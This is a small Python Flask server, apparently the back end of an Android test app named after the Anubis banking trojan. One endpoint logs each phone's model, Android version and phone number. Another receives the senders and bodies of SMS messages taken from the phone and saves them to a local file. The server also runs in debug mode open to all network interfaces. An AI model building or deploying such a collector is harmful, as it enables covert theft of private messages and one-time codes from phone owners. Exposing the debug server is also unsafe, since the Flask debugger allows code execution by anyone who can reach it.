from flask import Flask, request, jsonify, render_template
import json
import os
app = Flask(__name__)


@app.route("/device", methods=["POST"])
def device():
    device_info = request.get_json()
    Manufacturer = device_info['manufacturer']
    Model = device_info['model']
    verison = device_info['androidVersion']
    phoneno = device_info['phoneno']
    if phoneno ==None:
     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison)
    else:
     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison +  " and phone number is " + phoneno)
   
    return "deviceinfo working", 200
    
@app.route("/sms", methods=["POST"])
def sms():
    sms_content = request.get_json()
    address = sms_content['smsAddress']
    body = sms_content['smsBody']

    # best is to create a txt file in your desired directory, then append to said directory
    with open(os.path.join('C:\\Users\\Jevan\\OneDrive\\Documents\\GitHub\\AnubisTestApp\\', 'smsdata.txt'), 'a') as f:
        f.write('\n' + body)

    print("SMS Retrieved from Phone Number(" + address + ") : " + body)
    return "SMS Retrieved from Phone Number(" + address + ") : " + body , 200

if __name__ == "__main__":
    app.run('0.0.0.0', debug=True)

    
